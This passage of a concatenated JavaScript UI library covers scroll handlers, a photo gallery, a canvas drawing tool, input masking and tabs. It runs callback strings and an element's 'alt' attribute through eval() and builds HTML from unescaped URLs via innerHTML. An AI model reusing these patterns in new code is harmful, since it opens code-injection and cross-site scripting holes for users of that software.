							local.list[i].objectEventString();
						else
							eval(local.list[i].objectEventString);
					}
					//else console.log(window.scrollY+"=="+local.list[i].objectZoom.y);
					break;
				case "scrollHidden":
					local.list[i].objectZoom=GetDivCoords(local.list[i].object);
					if(((parseInt(window.scrollY)<parseInt(local.list[i].objectZoom.y)) && local.direction<0)
					|| ((parseInt(window.scrollY)>parseInt(local.list[i].objectZoom.y)+parseInt(local.list[i].objectZoom.height)-parseInt(icH)) && local.direction>0)
					|| (parseInt(window.scrollY)<5))
					{
						if(local.list[i].active==1)local.list[i].active=0;
						if((typeof local.list[i].objectEventString)=="function")
							local.list[i].objectEventString();
						else
							eval(local.list[i].objectEventString);
					}
					//else console.log(window.scrollY+"=="+local.list[i].objectZoom.y);
					break;
				case "scrolling":
					local.list[i].objectZoom=GetDivCoords(local.list[i].object);
					{
						if(local.list[i].active==1)local.list[i].active=0;
						if((typeof local.list[i].objectEventString)=="function")
							local.list[i].objectEventString();
						else
							eval(local.list[i].objectEventString);
					}
					//else console.log(window.scrollY+"=="+local.list[i].objectZoom.y);
					break;
				
				default:;
			}
		}
	}
	//----------------------------------------------
	this.AddToList=function AddToList(typeName,objDivID,objFuncsStr,forMore)
	{
		if(!forMore)forMore=0;
		this.list[this.index]={};
		this.list[this.index].objDivID=objDivID;
		this.list[this.index].objectEventString=objFuncsStr;
		if(typeof objDivID == "object")
			this.list[this.index].object=objDivID;
		else
			this.list[this.index].object=document.getElementById(objDivID);
			
		if(forMore)this.list[this.index].active=2;
		else this.list[this.index].active=1;
		this.list[this.index].type=typeName;
		this.index++;
	}
	
	//----------------------------------------------
	this.AddShowByScroll=function AddShowByScroll(objDivID,objFuncsStr,forMore){
		local.AddToList("scrollShow",objDivID,objFuncsStr,forMore);
	}
	//----------------------------------------------
	this.AddScrolling=function AddScrolling(objDivID,objFuncsStr,forMore){
		local.AddToList("scrolling",objDivID,objFuncsStr,forMore);
	}
	//----------------------------------------------
	this.AddHiddenByScroll=function AddHiddenByScroll(objDivID,objFuncsStr,forMore){
		local.AddToList("scrollHidden",objDivID,objFuncsStr,forMore);	
	}
	
	//----------------------------------------------
	AddEventOnObject(container,'scroll',local.eventScroll);
}
//----------------------------------------------
function focusSinglePage(objId,clsStyle,bodyStyle){
    var local=this;
    this.reloaderSinglePage="";
    this.objectId=objId;
    this.focusedStyle="";
    this.bodyStyle="";

    if(clsStyle)this.focusedStyle=clsStyle;
    if(bodyStyle)this.bodyStyle=bodyStyle;


this.setFocus=function setFocus(){
console.log("SET FOCUS");
    clearTimeout(local.reloaderSinglePage);
    local.reloaderSinglePage=setTimeout(function(){
		    var mjrObj=document.getElementById(local.objectId);
		    addClass(document.body,"anim");
		    addClass(mjrObj,"anim_move");
		    addClass(mjrObj,"anim_play");
		    addClass(mjrObj,local.objectStyle);
		    addClass(document.body,local.bodyStyle);
		    var icH = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;
		    mjrObj.style.height=icH+"px";
 		    mjrObj.scrollIntoView({ block: "start",  behavior: "smooth"}); 
            },400);
}

this.offFocus=function offFocus(){
    clearTimeout(local.reloaderSinglePage);
    local.reloaderSinglePage=setTimeout(function(){
	 var mjrObj=document.getElementById(local.objectId);
		    delClass(mjrObj,"anim_move");
		    delClass(mjrObj,"anim_play");
		    delClass(mjrObj,local.objectStyle);
		    delClass(document.body,local.bodyStyle);
		    mjrObj.style.height="";
        },400);
}

this.init=function init(){
     if(!mainHtmlLines)mainHtmlLines=new jc_divline();
	console.log(local.objectId+"---------------------------");

	mainHtmlLines.AddShowByScroll(local.objectId,local.setFocus,true);
	mainHtmlLines.AddHiddenByScroll(local.objectId,local.offFocus,true);
}

this.init();
}//end class

//----------------------------------------------

/* jc_photogallery.js */

/**
 * PhotoGallery - JavaScript JooCha Library
 *
 * 
 * @link    http://joocha.com
 * @license For open source use: GPLv3
 *          For commercial use: Commercial License
 * @author  John Chavchanidze
 * @version 1.2.1
 *
 * See usage examples at http://joocha.com/examples
 */

var GALLERYOBJPP;
var GALLERYOBJINDEX=0;
var GALLERYIMGLIST=[];
var GALLERYOBJECTS=[];

//---------------------------------------------------
var IMGCHANGEEFFECTCOUNTER=0;
function RemoveImageByEffect(tmpimgid)
{
	var img=document.getElementById(tmpimgid);
	if(img){
		var paro=img.parentNode;
		paro.removeChild(img);
	}
}
//---------------------------------------------------
function ChangeImageByEffect(imgid,isrc,pnteval,xchgtime)
{
var ino=IMGCHANGEEFFECTCOUNTER++;
tmpimgid=imgid+'__TEMPIMGFORCHANGE'+ino;
var img=document.getElementById(imgid);
var cln=document.getElementById(imgid).cloneNode(true);
var paro=img.parentNode;

img.id=tmpimgid;
cln.src=isrc;

if(pnteval)
{
   var local=img;
    eval(pnteval);
}

paro.insertBefore(cln,img);
if(!xchgtime)xchgtime=7000;
setTimeout("RemoveImageByEffect('"+tmpimgid+"')",xchgtime);
return 0;
}

//----------------------------------------------s

function JC_Gallery(ContainerIdName,imgList)
{
var local=this;
this.GALLERYOBJIPOS=0;
this.phts_glob;
this.classAddon='APG9';
this.imgfix='h';
this.pgWidth="640";
this.pgHeight="480";
this.pgpanW="50";
this.pgpanH="50";
this.id=this.name=ContainerIdName;
this.logoUrl="";
this.container="";
this.ImageList=[];
this.ImageResponsive=[[1200,900],[1024,800],[800,600],[640,480],[480,300],[0,0]];

this.init=function init(nm,imgList){
	GALLERYOBJINDEX++;
	local.index=GALLERYOBJINDEX;
	if(!imgList || imgList==undefined)imgList=[];
	GALLERYIMGLIST[local.index]=local.ImageList=imgList;
	GALLERYOBJECTS[local.index]=local;
	
	local.container=null;
	if(nm && nm!=undefined){
		if((typeof nm)=="object"){
			local.container=nm;
		}else{
			local.container=document.getElementById(nm);
		}
	}else {
		local.container=document.createElement("div");
	}
	if(local.container.id){
		local.container.id="jcGallery"+local.index;
	}
	
	for(var i=0;i<local.container.attributes.length;i++){
		if(local.container.attributes[i].name && local.container.attributes[i].name.toLowerCase().indexOf("data-")){
			local[local.container.attributes[i].name.toLowerCase().substr(5)]=local.container.attributes[i].value;
		}
	}

	if(local.ImageList.length<=0){
		var els=document.getElementsByTagName("img");
		for(var k=0;k<els.length;k++){
			local.ImageList[local.ImageList.length]=els[k].getAttribute("src");
			els[k].setAttribute("data-position",k);
			AddEventOnObject(els[k],"click",local.PhotoPreviewX);
		}
	}

	local.maximize();
	local.pgWidth=parseInt(local.pgWidth);
	local.pgHeight=parseInt(local.pgHeight);
	local.pgpanW=parseInt(local.pgpanW);
	local.pgpanH=parseInt(local.pgpanH);

}

this.maximize=function maximize()
{
	var doc=SelfDocument;
	var crd=GetObjectCoords(doc,doc.documentElement);
	//var y=Math.max(parseInt(doc.body.scrollTop),parseInt(doc.documentElement.scrollTop))+15+'px'
	//var x='25px';
	
	w=parseInt(crd.clientWidth)-100;
	h=parseInt(crd.clientHeight)-150;
	local.pgWidth=local.ImageResponsive[0][0];
	local.pgHeight=local.ImageResponsive[0][1];
	
	for(var l=1;l<local.ImageResponsive.length;l++){
		if(w<local.ImageResponsive[l-1][0] && w>=local.ImageResponsive[l][0]){
			local.pgWidth=local.ImageResponsive[l-1][0];
			local.pgHeight=local.ImageResponsive[l-1][1];
			break;
		}
		if(h<local.ImageResponsive[l-1][1] && h>=local.ImageResponsive[l][1]){
			local.pgWidth=local.ImageResponsive[l-1][0];
			local.pgHeight=local.ImageResponsive[l-1][1];
			break;
		}
		
	}
}

this._StartProgress=function _StartProgress()
{
	var obj=document.getElementById('_rogress'+local.classAddon);
	obj.style.visibility='visible';
	obj.style.display="inline-block";
}

this._StopProgress=function _StopProgress()
{
	var obj=document.getElementById('_rogress'+local.classAddon);
	obj.style.visibility='hidden';
	obj.style.display="none";
}

this._Open=function _Open(t)
{
   local.GALLERYOBJIPOS=t;
   if(local.imgfix=='w')
   local.OpenEx(t,'&ih='+local.pgHeight.toString()+'&imgfix='+local.pgWidth.toString());
   else
   if(local.imgfix=='h')
   local.OpenEx(t,'&iw='+local.pgWidth.toString()+'&imgfix='+local.pgHeight.toString());
   else
   local.OpenEx(t,"");
}

this.OpenEx=function OpenEx(t,par)
{
   local.GALLERYOBJIPOS=t;
   if(!par)par='';
   var locUrl='';
   if(local.phts_glob.indexOf(WebLinkImg)==-1)locUrl=WebLinkImg+local.phts_glob[t];
   
   ChangeImageByEffect('PhotoPreview'+local.classAddon,locUrl+par, "local.style.width='0px';");
   document.getElementById('photoRollic'+local.classAddon).scrollLeft=t*190/2;
   local._StartProgress();
}


var PointerOfSlider;
this.StartSlider=function StartSlider()
{
	clearInterval(PointerOfSlider);
   PointerOfSlider=setInterval(local._Next,3000);
	document.getElementById('PPSS'+local.classAddon).innerHTML='||';
}

this.StopSlider=function StopSlider()
{
   clearInterval(PointerOfSlider);
   PointerOfSlider=0;
  document.getElementById('PPSS'+this.classAddon).innerHTML='||&gt;';
}

this._Slider=function _Slider()
{
if(PointerOfSlider)local.StopSlider();
else  local.StartSlider();
}

this._Next=function _Next(par)
{
  local.GALLERYOBJIPOS++;
  if(!par)par='';
  if(local.GALLERYOBJIPOS>=local.phts_glob.length)local.GALLERYOBJIPOS=0;
  local.OpenEx(local.GALLERYOBJIPOS,par);
}

this._Back=function _Back(par)
{
   local.GALLERYOBJIPOS--;
   if(!par)par='';
   if(local.GALLERYOBJIPOS<0)local.GALLERYOBJIPOS=(local.phts_glob.length-1);
   local.OpenEx(local.GALLERYOBJIPOS,par);
}

//deprecated
this.PhotoPreview001=function PhotoPreview001(objs,indx){

}
//
this.PhotoPreviewX=function PhotoPreviewX(indx)
{

	var phts=local.ImageList;
   if(this && this.getAttribute && this.getAttribute("data-position"))indx=this.getAttribute("data-position");	
   if(!indx)indx=0;
   
//console.log(indx);
   winclose(GALLERYOBJPP);
   var objnm=GetFreeWindowName();
   AlphaMainWin(0.25,"winclose(GALLERYOBJPP);" );
   
   var galleryPanel='';
	galleryPanel+='<div class="gallery_panel">';
	galleryPanel+='<b id="PPSS'+local.classAddon+'"  class="PPSS '+local.classAddon+'" onclick="GALLERYOBJECTS['+local.index+']._Slider()" data-slider="'+(PointerOfSlider?'1':'0')+'">'+(PointerOfSlider?'||':'||&gt;')+'</b>';
	galleryPanel+='<b class="jc_winbutton jc_close" onclick="ShowNormalMainWin();winclose(GALLERYOBJPP);">X</b>';
	galleryPanel+='</div>';
	
	
	local.xWinContainer=GALLERYOBJPP=CreateHTMLWindowEx(null,1,1,1,1,"getobject");
	local.xWinContainer.className='fixWin';
	local.xWinContainer.id=local.name+"_xWinContainer";
	winmaximize(local.xWinContainer);
	  
	local.xWin=new jc_xwin(local.xWinContainer.id);


local.phts_glob=phts;
var photoRollic='';
photoRollic+="<div id='photoRollic"+local.classAddon+"' class='photoRollic "+local.classAddon+"'><div id='imgRollicList"+local.classAddon+"' class='imgRollicList "+local.classAddon+"'>";

for(var t=0;t<phts.length;t++)
{
if(local.imgfix=='w')
  photoRollic+="<img src='"+phts[t]+"&ih="+local.pgpanH+"&imgfix="+local.pgpanW+"' onclick='GALLERYOBJECTS["+local.index+"]._Open("+t+");'>";
else
if(local.imgfix=='h')
  photoRollic+="<img src='"+phts[t]+"&iw="+local.pgpanW+"&imgfix="+local.pgpanH+"' onclick='GALLERYOBJECTS["+local.index+"]._Open("+t+");'>";
else
  photoRollic+="<img src='"+phts[t]+"' onclick='GALLERYOBJECTS["+local.index+"]._Open("+t+");'>";  
}
photoRollic+="</div></div>";
 
   var Vhtml="";

Vhtml+="<div class='blockPhotoGallery "+local.classAddon+"'>";
Vhtml+=galleryPanel;

Vhtml+="<div class='mainPhoto' style='position:relative;background:black;z-index:1000;cursor:default;'>";
Vhtml+="<img id='PhotoPreview"+local.classAddon+"'  class='PhotoPreview pgBut' onload='GALLERYOBJECTS["+local.index+"]._StopProgress()' name='PhotoPreview"+local.classAddon+"'  src='"+phts[indx]+"&iw="+local.pgWidth+"&imgfix="+local.pgHeight+"' >";
Vhtml+="   <div class='functionPanel' >";
Vhtml+="<div id='PPBack"+local.classAddon+"'  class='PPBack pgBut' name='PPBack"+local.classAddon+"' onclick='GALLERYOBJECTS["+local.index+"]._Back()'>-</div>";
Vhtml+="<div id='PPNext"+local.classAddon+"'  class='PPNext pgBut' name='PPNext"+local.classAddon+"' onclick='GALLERYOBJECTS["+local.index+"]._Next()' >+</div>";
Vhtml+="<div id='_rogress"+local.classAddon+"'  class='_rogress pgBut' ></div>";
Vhtml+="   </div>";
Vhtml+="</div>";

Vhtml+=photoRollic;
Vhtml+="</div>";

//GlobalWinResizingHTMLMethod="{document.getElementById('imgPanRollic"+local.classAddon+"').style.width='"+(phts.length*local.pgpanW+180+phts.length*10)+"px';}";
//WinStartResizing(GALLERYOBJPP,GLOBWINOBJLEFT,GLOBWINOBJTOP,local.pgWidth+'px',(local.pgHeight+120)+'px',20,Vhtml);
local.xWin.wBody.innerHTML=Vhtml;

}


	//Public static functions
	this.xGet=function xGet(nm)
	{
		//if(nm in GALLERYOBJECTS)return GALLERYOBJECTS[nm];
		
		for(var i=GALLERYOBJECTS.length-1;i>=0;i--)
		if(GALLERYOBJECTS[i]!=undefined && GALLERYOBJECTS[i])
			if(GALLERYOBJECTS[i].name==nm)return GALLERYOBJECTS[i];
		return null;
	}
	
	this.pointer=null;
	if(this.pointer=this.xGet(ContainerIdName))return this.pointer;
	this.init(local.id,imgList);
	
}




/* DrawPencilOnImage.js */

 function DrawPencilOnImage(vId,vCanvasId,xchg) 
 {
  var local=this;
  var canvas, context, tool,onChangeProc;
  var Id,CanvasId;

  
  function init (vId,vCanvasId,xchg) 
  {
	if(!vId)vId='imageView';
	if(!vCanvasId)vCanvasId=vId+'_canvas';
	Id=vId;
	CanvasId=vCanvasId;
	
	var i=document.getElementById(Id);
	if(i)i.value='';
		
	onChangeProc='';
	if(xchg)onChangeProc=xchg;
    canvas = document.getElementById(vCanvasId);
    if (!canvas) 
	{
      alert('Error: Cannot find canvas element!');
      return;
	}

    if (!canvas.getContext) 
	{
      alert('Error: no canvas.getContext!');
      return;
    }

    context = canvas.getContext('2d');
    if (!context) 
	{
      alert('Error: failed to getContext!');
      return;
    }
	
	var srcimg=document.getElementById(Id+'___image');
	if(srcimg)context.drawImage(srcimg,0,0);
	
	context.strokeStyle='blue';
	context.globalAlpha = 0.5;
    tool = new tool_pencil();
    canvas.addEventListener('mousedown', ev_canvas, false);
    canvas.addEventListener('mousemove', ev_canvas, false);
    canvas.addEventListener('mouseup',   ev_canvas, false);
	canvas.addEventListener('mouseup',   onChangeImage, false);
	
    var clr=document.getElementById(Id+'___clear');
	if(clr)clr.addEventListener('click', local.clearDraw, false);
	
	if(onChangeProc)canvas.addEventListener('mouseup',   onChangeProc, false);
  }

  function tool_pencil () 
  {
    var tool = this;
    this.started = false;

    this.mousedown = function (ev) 
	{
        context.beginPath();
        context.moveTo(ev._x, ev._y);
        tool.started = true;
    };

    this.mousemove = function (ev) 
	{
      if (tool.started) 
	  {
        context.lineTo(ev._x, ev._y);
        context.stroke();
      }
    };

    this.mouseup = function (ev) 
	{
      if (tool.started) 
	  {
        tool.mousemove(ev);
        tool.started = false;
      }
    };
  }

  function ev_canvas (ev) 
  {
    if (ev.layerX || ev.layerX == 0) 
	{ // Firefox
      ev._x = ev.layerX;
      ev._y = ev.layerY;
    } else if (ev.offsetX || ev.offsetX == 0) 
	{ // Opera
      ev._x = ev.offsetX;
      ev._y = ev.offsetY;
    }

    // Call the event handler of the tool.
    var func = tool[ev.type];
    if (func) 
	{
      func(ev);
    }
  }
  
  function onChangeImage()
  {
    var v=document.getElementById(Id+'___data');
	if(v)v.value=local.toDataURL();
    var i=document.getElementById(Id);
	if(i)i.value='true';
	
  }
  
  this.clearDraw=function clearDraw()
  {
	context.clearRect(0, 0, canvas.width, canvas.height);
  }
  
  this.toDataURL=function toDataURL(tp)
  {
     if(!tp)tp='image/png';
	return canvas.toDataURL(tp);
  }
  
  

  init(vId,vCanvasId,xchg);

}





/* jc_mask.js */

/*
class jc_mask gankutvnilia input elementshi monacemebis shekvanis maskirebistvis;
input veli koda ramdenime nabijebad-Stepebad da Tvitoeul Steps akvs tavis konkretuli formati;
Formatis Tipebia:
Number: [0-9]
Sign: [-]
Aplhabet: [a-zA-Z]
Symbols: [\-\+_\.\,\:\;]

Formati Stepebi:
1: /-/i
2: [0-9] - #
4: [.]- 
3: [0-9]

-#,#.##
[0-9]+
,
[a-zA-Z]+

*/
//=======================================================
function jc_mask(idname,attrname)
{
var local=this;
this.id;
this.myObject;
this.strAttribute;
this.objAttribute;
this.type;
//this.method='format';
//this.method_list=new Array('format','fixed');
this.format;
this.showformat;
this.CursorPos;
this.insertMode=0;
this.DisableKeyArray=new Array(8,9,13,16,17,18,19,20,33,34,35,36,37,38,39,40,45,46,144,145);
this.charTypes={vAll:'',vNumeric:'0123456789',vInt:'-0123456789',vFloat:'-0123456789.',uInt:'0123456789',uFloat:'0123456789.',vSign:'-',vFormatChars:'#0A?\.'};
this.format_converts=[['#','\\d+',false,'vFloat'],['0','\\d',false,'vFloat'],['a','\\w+',false,'vAll'],['A','\\w+',false,'vAll'],['c','\\w',false,'vAll'],['C','\\w',false,'vAll']];//char, RegExp, Used, AllowCharListName 
this.StepsKeyAllows=[];//Formatshi
this.StepsFormat=[];//Formatshi
this.allowChars='';
this.firstCursorPos={Start:0,End:0};
//-------------------------------------------------------------------------------------------
this.addslashes=function addslashes(str,charlist){
if(!charlist)charlist='+=,./[]{}():\\?!@#$%^&*';
ret='';
for(var i=0;i<str.length;i++)
if(charlist.indexOf(str.charAt(i))!=-1)
	ret+='\\'+str.charAt(i);
else 
	ret+=str.charAt(i);
	
return ret;
}
//-------------------------------------------------------------------------------------------
this.toStringWithFormat=function toStringWithFormat(val,idx)
{
	if(!val)val=local.myObject.value;
	if(!idx)idx=0;
	var arrFrmt=local.StepsKeyAllows;
	var k,j,p,rge,arr;
	var ret='',frmtp;
	var idxRet=0,idxCurrK=0,idxNext=0,ix;
    for(k=0;k<local.StepsFormat.length;k++)
    {
	
		if(local.StepsFormat[k][1]=='string')
		{
			ret+=local.StepsFormat[k][0];
			ix=val.indexOf(local.StepsFormat[k][0]);
			if(ix!=-1)
			{
				val=val.substr(ix);
				if(idxNext==0 && idxRet!=0 && idxCurrK==k-1 && local.StepsFormat[k][0].length)
				{
					idxNext=(local.StepsFormat[k][0].length>0)?local.StepsFormat[k][0].length:0;
				};
			}
		}
		else
		if(local.StepsFormat[k][1]=='regexp')
		{
			frmtp=local.StepsFormat[k][0].match(/(\+|\?|\*)/i);
		    rge=new RegExp(local.StepsFormat[k][0],'i');
			arr=val.match(rge);
			if(!arr)continue;
			val=val.substr(arr.index+arr[0].length);
			ret+=arr[0];
			if(idxRet==0 && ret.length>=idx)
			{
				if(frmtp==null)
				{idxRet=ret.length;idxCurrK=k;}
				else
				//{idxRet=idx;idxCurrK=-99;}//for keyUp with get cursor pos
				{idxRet=ret.length;idxCurrK=-99;}//for keyUp stay old cursor
			}
		}

    }

	if(idxRet==0 && idxNext==0)idxRet=ret.length;
	return {value:ret,index:(idxRet+idxNext)};
}
//-------------------------------------------------------------------------------------------
this.toCursorChangeWithFormat=function toCursorChangeWithFormat(val,idx,key)//if key==37 then left key
{
	if(!val)val=local.myObject.value;
	if(!idx)idx=0;
	var arrFrmt=local.StepsKeyAllows;
	var k,j,p,rge,arr;
	var ret='',frmtp;
	var idxRet=0,lastIndex=0;
    for(k=0;k<local.StepsFormat.length;k++)
    {
		if(local.StepsFormat[k][1]=='string')
		{
			ret+=local.StepsFormat[k][0];
			if(idxRet==0 && ret.length>=idx)
			{
				idxRet=ret.length;
				break;
			}
			
		}
		else
		if(local.StepsFormat[k][1]=='regexp')
		{
			frmtp=local.StepsFormat[k][0].match(/(\+|\?|\*)/i);
		    rge=new RegExp(local.StepsFormat[k][0],'i');
			arr=val.match(rge);
			if(!arr)break;
			val=val.substr(arr.index+arr[0].length);
			ret+=arr[0];
			lastIndex=ret.length-1;
			if(idxRet==0 && ret.length>=idx)
			{
				idxRet=ret.length;
				break;
			}
			
		}

    }
	if(key==37)
	{
		if(lastIndex>=idx && idx>0)lastIndex=idx-1;
		idxRet=lastIndex;
	}
	else
	while(local.StepsFormat[k+1][1]=='string' || ((local.StepsFormat[k+1][1]=='regexp')&&(local.StepsFormat[k+1][0]=='')))
	{
		ret+=local.StepsFormat[k+1][0];
		idxRet=ret.length;
		k++;
	}

	return {value:ret,index:idxRet};

}

//-------------------------------------------------------------------------------------------
this.formatInitial=function formatInitial(format){
   var c,pStr='',pFrmt='';//char for format string parser
   var KeyArr=local.format_converts,AllowChars='',AllowAll=false;
   var i,j,p,k;
   for(i=0;i<local.format_converts.length;i++)
   {
		if(pFrmt!='')pFrmt+='|';
		pFrmt+=local.format_converts[i][0];
   }
   if(pFrmt)pFrmt='('+pFrmt+')';
   var regFrmt=new RegExp(pFrmt,'igm');
   var arrFrmt=format.split(regFrmt);
   local.StepsKeyAllows=arrFrmt;
   local.StepsFormat=new Array();
   local.firstCursorPos={Start:0,End:0};
   
   for(k=0;k<arrFrmt.length;k++)
   {
		c=arrFrmt[k].charAt(0);
		for(j=0;j<local.format_converts.length;j++)
		if(c==local.format_converts[j][0])
		{
			KeyArr[j][2]=true;
			if(KeyArr[j][3]=='vAll' || !KeyArr[j][3])AllowAll=true;
			if(KeyArr[j][3])AllowChars+=local.charTypes[KeyArr[j][3]];
			break;
		}
		
		
		if(j<local.format_converts.length && c==local.format_converts[j][0])
		{
			c='';
			for(p=0;p<arrFrmt[k].length;p++)
			{
				c+=local.format_converts[j][1];
			}
			pStr+=c;
			local.StepsFormat[k]=[c,'regexp'];
		}else
		{
			c=arrFrmt[k];
			pStr+=c;
			local.StepsFormat[k]=[c,'string'];
			if(k==0)
			{
				local.firstCursorPos.Start=c.length;
				local.firstCursorPos.End=c.length;
			}
		}
   }
   
   if(!AllowAll)local.allowChars=AllowChars;
   //console.log(local.StepsKeyAllows);
   //console.log(local.StepsFormat);
   
   return pStr;
}
//-------------------------------------------------------------------------------------------
this.init=function init(idname,attrname){
  local.id=idname;
  local.myObject=document.getElementById(local.id);
  if(!attrname)attrname='alt';
  local.strAttribute=local.myObject.getAttribute(attrname);
  console.log(local.strAttribute);
  
  try{
	eval("local.objAttribute="+local.strAttribute+";");//attribute may be Object: {type="int",value="1"}
	(local.objAttribute.type) ? local.type=local.objAttribute.type:local.type='format';

	local.format=local.objAttribute.format;
	if(local.objAttribute.insertMode)local.insertMode=1;else local.insertMode=0;
  
	if(local.objAttribute.addon_symbols)
	{
		var b=local.format_converts.length;
		for(var i=0;i<local.objAttribute.addon_symbols.length;i++)
		{
			local.format_converts[b]=local.objAttribute.addon_symbols[i];
			b++;
		}
	}
	
	local.showformat=local.objAttribute.showformat;
	
  }catch(e){
	local.format=local.strAttribute;
	local.insertMode=1;
	local.type='format';
	local.showformat=1;
  }
  
  

  
  switch(local.type)
  {
  case 'format':
	local.allowChars='';
	break;
  case 'float':	
  case 'number':
	local.format='-#.#';
	local.allowChars=local.charTypes.vFloat;
  break;
  case 'int':
	local.format='-#.#';
	local.allowChars=local.charTypes.vInt;
  break;
  
  case 'ufloat':	
  case 'unumber':
	local.format='-#.#';
	local.allowChars=local.charTypes.uFloat;
  break;
  case 'uint':
	local.format='-#.#';
	local.allowChars=local.charTypes.uInt;
  break;
  }
  
  local.formatInitial(local.format);  
  
  
  if(local.showformat)
  {
	local.myObject.value=local.format;
	local.setCaretPosition(local.myObject,local.firstCursorPos);
  }
  local.CursorPos=null;

  AddEventOnObject(local.myObject,'focus',local.onFocus);
  AddEventOnObject(local.myObject,'blur',local.onBlur);
  AddEventOnObject(local.myObject,'keydown',local.onKeyDown);
  AddEventOnObject(local.myObject,'keyup',local.onKeyUp);
  AddEventOnObject(local.myObject,'keypress',function(event){return local.onKeyPress(event);});

}
//-------------------------------------------------------------------------------------------
this.getChar=function getChar(event) {
	return event.charCode || event.which || event.keyCode;
}
//-------------------------------------------------------------------------------------------
this.onFocus=function onFocus(event){
	local.CursorPos=local.getCaretPosition(local.myObject);
}
//-------------------------------------------------------------------------------------------
this.onBlur=function onBlur(event){
	local.CursorPos=null;
}
//-------------------------------------------------------------------------------------------
this.onKeyDown=function onKeyDown(event){
	event = event || window.event; 
	var charCode=local.getChar(event);

	if((local.DisableKeyArray.indexOf(charCode)!=-1)
	    || (local.allowChars.indexOf(String.fromCharCode(charCode))!=-1)
		){
		local.CursorPos=null;		
		return true;
	}
  
return true;
}
//-------------------------------------------------------------------------------------------
this.onKeyUp=function onKeyUp(event)
{
	event = event || window.event; 
	var val=local.myObject.value;
	var charCode=local.getChar(event);
	if(local.CursorPos==null)local.CursorPos=local.getCaretPosition(local.myObject);

	if(local.DisableKeyArray.indexOf(charCode)==-1)
	{
		var ret=local.toStringWithFormat(val,local.CursorPos.Start);
		local.myObject.value=ret.value;
		local.setCaretPosition(local.myObject,ret.index);
	}else
	{
		var ret=local.toCursorChangeWithFormat(val,local.CursorPos.Start,charCode);
		local.setCaretPosition(local.myObject,ret.index);
	}
return true;
}
//-------------------------------------------------------------------------------------------
this.onKeyPress=function onKeyPress(event)
{
	event = event || window.event; 
	var charCode=local.getChar(event);
	if((local.DisableKeyArray.indexOf(charCode)!=-1)
	    || (local.allowChars.indexOf(String.fromCharCode(charCode))!=-1)
		){
		return true;
	}
	
	
	if(local.allowChars && local.allowChars.indexOf(String.fromCharCode(charCode))==-1)
	{
  	   if (event.preventDefault)
    	    event.preventDefault();
	   else event.returnValue = false;
	   return false;
	}
return true;	
}
//-------------------------------------------------------------------------------------------
this.getCaretPosition=function getCaretPosition(ctrl) {

    var CaretPos = {Start:0, End:0};
    // IE Support
    if (document.selection) {

        ctrl.focus ();
        var Sel = document.selection.createRange ();

        Sel.moveStart ('character', -ctrl.value.length);

        CaretPos.Start = CaretPos.End = Sel.text.length;
    }
    // Firefox support
    else if (ctrl.selectionStart || ctrl.selectionStart == '0')
	{
        CaretPos.Start = ctrl.selectionStart;
        CaretPos.End = ctrl.selectionEnd;		
	}
	local.CursorPos=CaretPos;

    return (CaretPos);

}
//-------------------------------------------------------------------------------------------
this.setCaretPosition=function setCaretPosition(ctrl, pos){
	var Start=0,End=0;
	if (pos instanceof Object)
	{
		Start=pos.Start;
		End=pos.End+local.insertMode;
	}
	else
	{
		Start=pos;
		End=pos+local.insertMode;
	}
	
    if(ctrl.setSelectionRange)
    {
        ctrl.focus();
        ctrl.setSelectionRange(Start,End);
    }
    else if (ctrl.createTextRange) {
        var range = ctrl.createTextRange();
        range.collapse(true);
        range.moveEnd('character', Start);
        range.moveStart('character', End);
        range.select();
    }
	if(!local.CursorPos)local.CursorPos={Start:0,End:0};
	local.CursorPos.Start=Start;
	local.CursorPos.End=End;
	
}
//-------------------------------------------------------------------------------------------
if(!attrname)attrname='';
if(idname)this.init(idname,attrname);
}//class

//-------------------------------------------------------------------------------------------
function maskFormEnd(formname,attrname)
{
	if(!attrname)attrname='alt';
	var frm=document.getElementById(formname);
	if(!frm)return 0;
	var els=frm.getElementsByTagName("INPUT");
	if(!els)return 0;
	for(var i=0;i<els.length;i++)
	if(els[i] && els[i].id)
	{
		var atr=els[i].getAttribute(attrname);
		if(atr)
		{
			new jc_mask(els[i].id,attrname);
		}
	}
	
}
//-------------------------------------------------------------------------------------------

/* jc_tabs.js */

function jc_tabs(nm,cls)
{
	var local=this;
	this.name;
	this.elParent;
	this.classname;
	this.elTabs;
	this.elContent;
	this.elData;
	this.count=0;
	this.lastActivate;
	if(!nm)nm='jc_tabs';
	if(!cls)cls=nm;
	
	this.init=function init(nm,cls)
	{
		local.name=nm;
		local.elParent=document.getElementById(local.name);
		local.classname=cls;
		if(!local.elParent.getAttribute("class"))local.elParent.setAttribute("class",local.classname);
		
		local.elTabs = document.createElement("div");
		local.elTabs.setAttribute("id",local.name+'_tabs');
		local.elTabs.setAttribute("class",local.classname+'_tabs');
		local.elParent.appendChild(local.elTabs);
		
		local.elData = document.createElement("div");
		local.elData.setAttribute("id",local.name+'_datalist');
		local.elData.setAttribute("class",local.classname+'_datalist');
		local.elParent.appendChild(local.elData);
	}
	
	this.radiochange=function radiochange()
	{
		var nm=this.getAttribute('idxName');
		var cnt=this.getAttribute('idxCount');
		var obj=document.getElementById(nm+"_data_"+cnt);
		var rad=document.getElementById(nm+"_radio_"+cnt);
		if(local.lastActivate)local.lastActivate.setAttribute('activate','inactive');
		if(rad.checked)
			obj.setAttribute('activate','active');
		else
			obj.setAttribute('activate','inactive');
		local.lastActivate=obj;
	}
	
	this.additem=function additem(tabname,tabcontent,tabtype)
	{
		if(!tabtype)tabtype=1;
		var tbs = document.createElement("div");
		tbs.setAttribute("id",local.name+'_tab_'+local.count);
		tbs.setAttribute("class",local.classname+'_tab');
		tbs.style.cssFloat="left";
		tbs.style.cursor="pointer";
		local.elTabs.appendChild(tbs);	
	
		var inp = document.createElement("input");
		inp.setAttribute("id",local.name+'_radio_'+local.count);
		inp.setAttribute("name",local.name+'_radio');
		inp.setAttribute("idxCount",local.count);
		inp.setAttribute("idxName",local.name);
		inp.type="radio";
		try{
			AddEventOnObject(inp,'click',this.radiochange);
		}catch(e)
		{
			inp.onclick=this.radiochange;
		}
		tbs.appendChild(inp);
	
		var lab = document.createElement("label");
		lab.setAttribute("for",local.name+'_radio_'+local.count);
		lab.innerHTML=tabname;
		tbs.appendChild(lab);

		switch(tabtype)
		{
		case 1:
		case '1'://Moving Content
			var dts = document.createElement("div");
			dts.setAttribute("id",local.name+'_data_'+local.count);
			dts.setAttribute("class",local.classname+'_data');
			dts.setAttribute('activate','inactive');
			dts.appendChild(document.getElementById(tabcontent));
			local.elData.appendChild(dts);
		break;
		
		default:
			var dts = document.createElement("div");
